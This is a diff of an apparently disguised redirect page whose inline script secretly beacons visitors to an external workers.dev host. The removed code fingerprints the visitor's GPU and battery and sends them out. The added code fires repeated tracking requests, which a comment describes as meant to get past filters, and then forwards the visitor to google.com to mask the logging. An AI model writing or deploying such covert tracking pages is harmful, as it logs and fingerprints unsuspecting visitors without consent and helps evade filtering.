@@ -3,45 +3,30 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-async function getSpecs() {
-    let gpu = "N/A";
-    let bat = "N/A";
-    
-    // Сбор данных GPU
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    } catch (e) {}
+async function xray() {
+    // Собираем данные один раз
+    const t = encodeURIComponent(new Date().toLocaleString());
+    const rnd = Math.random().toString(36).substring(7);
+    const workerUrl = `https://adminfdm.alexgranny1708.workers.dev/?t=${t}&v=${rnd}`;
 
-    // Сбор данных батареи
-    try {
-        const battery = await navigator.getBattery();
-        bat = `${Math.round(battery.level * 100)}%${battery.charging ? '+' : '-'}`;
-    } catch (e) {}
-
-    const params = new URLSearchParams({
-        t: new Date().toLocaleString(),
-        gpu: gpu,
-        bat: bat,
-        rnd: Math.random().toString(36).substring(7)
-    });
-
-    const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/" + params.toString();
-    const img = new Image();
-    
     const go = () => { window.location.replace("https://google.com"); };
-    
-    img.onload = go;
-    img.onerror = go;
-    img.src = workerUrl;
-    
-    // Резервный таймер для медленных сетей
+
+    // Функция "выстрела" пакетом
+    const fire = () => {
+        const i = new Image();
+        i.src = workerUrl + "&attempt=" + Math.random();
+    };
+
+    // Серия залпов для пробива фильтров
+    fire(); 
+    setTimeout(fire, 500);
+    setTimeout(fire, 1000);
+
+    // Финальный редирект с запасом времени
     setTimeout(go, 2500);
 }
 
-getSpecs();
+xray();
 </script>
 </body>
 </html>
